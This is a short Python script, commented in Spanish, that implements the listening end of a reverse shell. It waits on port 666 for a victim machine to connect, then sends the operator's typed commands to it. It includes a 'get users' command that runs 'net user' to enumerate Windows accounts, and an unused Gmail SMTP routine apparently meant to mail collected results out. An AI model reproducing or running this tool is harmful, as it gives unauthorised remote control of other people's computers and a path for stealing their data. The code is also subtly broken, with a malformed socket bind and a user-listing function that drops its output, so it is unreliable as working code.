#!/usr/bin/env python3
import socket
import signal
import sys
from termcolor import colored
import smtplib # para enviar cosas por correo
from email.mime.text import MIMEText

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:

    def __init__(self, ip, port):
        self.options = {"get users": "List syustem valid users (Gmail)", "help": "Show this help panel"}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # para poder reutilizar la misma conexión
        server_socket.bind(ip, port)
        server_socket.listen()

        print(f"\n[+] Listening for incoming connections...")

        self.client_socket, self.client_address = server_socket.accept()

        print(f"\n[+] Connection established by {self.client_address}")

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()

    def send_email(self, subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Message sent!")

    def show_help(self):
        for key, value in self.options.items():
            print(f"{key} - {value}\n")

    def run(self):
        while True:
            command = input("$> ")

            if command == "get users":
                self.get_users()
            elif command == "help":
                self.show_help()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)

if __name__ == '__main__':
    my_listener = Listener("192.168.1.40", 666)
    my_listener.run()